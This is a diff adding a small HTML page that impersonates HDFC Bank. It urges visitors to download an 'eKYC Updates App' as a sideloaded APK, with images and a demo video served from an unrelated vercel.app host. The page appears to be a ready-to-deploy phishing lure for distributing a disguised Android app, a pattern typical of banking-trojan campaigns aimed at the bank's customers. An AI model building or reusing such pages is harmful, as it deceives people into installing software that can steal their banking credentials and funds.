@@ -1,1 +1,107 @@
-h
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Download HDFC BANK APK</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"> <!-- Responsive -->
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    html, body {
+      height: 100%;
+      font-family: Arial, sans-serif;
+    }
+
+    body {
+      background: url('https://hdfckpks.vercel.app/bakg.jpg') no-repeat center center fixed;
+      background-size: cover;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #fff;
+      padding: 15px;
+    }
+
+    .overlay {
+      background-color: rgba(0, 0, 0, 0.5);
+      padding: 25px;
+      border-radius: 12px;
+      text-align: center;
+      backdrop-filter: blur(4px);
+      width: 100%;
+      max-width: 400px; /* Mobile friendly width */
+    }
+
+    h2 {
+      font-size: 22px;
+      margin-bottom: 15px;
+    }
+
+    p {
+      font-size: 16px;
+      margin-bottom: 20px;
+    }
+
+    button {
+      padding: 12px 24px;
+      font-size: 16px;
+      background-color: #00be0c;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      width: 100%; /* Full width on mobile */
+    }
+
+    button:hover {
+      background-color: #0056b3;
+    }
+
+    a {
+      text-decoration: none;
+    }
+
+    /* Video styling */
+    video {
+      margin-top: 20px;
+      width: 100%;
+      max-width: 360px;
+      border-radius: 8px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.5);
+    }
+
+    /* Extra small screen tweaks */
+    @media (max-width: 480px) {
+      h2 {
+        font-size: 20px;
+      }
+      p {
+        font-size: 14px;
+      }
+      button {
+        font-size: 15px;
+        padding: 10px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="overlay">
+    <h2>Download HDFC BANK eKYC Updates App</h2>
+    <p>Click the button below to ⬇️download the latest APK file.</p>
+    <a href="hdfc_bank.apk" download>
+      <button>Download app </button>
+    </a>
+
+    <!-- Video screen below the button -->
+    <video controls>
+      <source src="https://hdfckpks.vercel.app/demo.mp4" type="video/mp4">
+      Your browser does not support the video tag.
+    </video>
+  </div>
+</body>
+</html>
